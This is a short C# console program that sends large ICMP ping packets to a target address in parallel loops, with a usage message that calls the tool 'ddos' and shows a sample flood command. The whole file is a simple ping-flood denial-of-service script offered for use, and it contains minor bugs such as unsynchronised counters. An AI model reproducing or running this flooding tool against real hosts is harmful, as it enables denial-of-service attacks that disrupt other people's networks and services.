using System.Net.NetworkInformation;
using System.Threading.Tasks;
using System;

namespace Ping_C_
{
    class Program
    {
        static void Main(string[] args)
        {
            // Specify Packet size and set up counter for successful and failed attempts
            byte[] packet = new byte[65500];
            int[] attempts = new int[2];


            try
            {
                // The below line will produce and error if arguments arefailed to be passed in from the cli
                double timeEst = 0.03 * float.Parse(args[1]);
                Console.WriteLine("Working, please wait.");

                // If time greater than 60 sec display in minutes
                if (timeEst < 60) Console.WriteLine("Time estimate: " + Math.Ceiling(timeEst) + "s.");
                else Console.WriteLine("Time estimate: " + Math.Ceiling(timeEst) / 60 + " min.");
            }

            // display info if error occurs and exit
            catch
            {
                Console.WriteLine("");
                Console.WriteLine("You need to provide three arguments.\n1: Adress \n2: Aumber of times you want to ping \n3: Timeout. \n\nEg.: ddos 192.168.178.1 10000 100");
                Console.WriteLine("");
                Environment.Exit(1);
            }

            try
            {
                // Loop over ping function 'args[1]' times with args[0] as ip adress and args[2] as ttl
                Parallel.For(0, Int32.Parse(args[1]), ctr =>
                {
                    Ping(args[0], Int32.Parse(args[2]), packet, attempts);
                });
            }

            catch
            {
                // Displaying number of succesful and Failed ping attempts
                Console.WriteLine("\nSuccessful: " + attempts[0] + "\nError: " + attempts[1]);
            }

            // Displaying number of succesful and Failed ping attempts
            Console.WriteLine("\nSuccessful: " + attempts[0] + "\nError: " + attempts[1]);
        }


        // Ping function
        static int[] Ping(string addres, int timeout, byte[] packet, int[] attempts)
        {
            // Create new ping agent and initiate object
            Ping pingAgent = new Ping();
            PingReply reply = pingAgent.Send(addres, timeout, packet);

            // increment indices of success[0] or failure[1]
            if (reply.Status == IPStatus.Success)
            {
                attempts[0]++;
                return attempts;
            }
            else
            {
                attempts[1]++;
                return attempts;
            }
        }

        static void PingNoCount(string addres, int timeout, byte[] packet, int[] attempts)
        {
            // Create new ping agent and initiate object
            Ping pingAgent = new Ping();
            PingReply reply = pingAgent.Send(addres, timeout, packet);
        }
    }
}
